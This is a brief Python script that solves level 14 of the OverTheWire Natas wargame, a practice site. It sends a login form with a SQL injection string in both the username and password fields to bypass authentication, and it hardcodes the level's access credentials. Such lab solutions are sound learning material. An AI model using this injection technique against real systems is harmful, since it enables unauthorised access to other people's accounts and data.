#!/usr/bin/env python


import requests
import re

username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests.Session()
# response = session.get(url, auth = (username, password) )
response = session.post(url, data = { "username" : '"="', "password" : '"="' }, auth = (username, password) )

content = response.text

print content
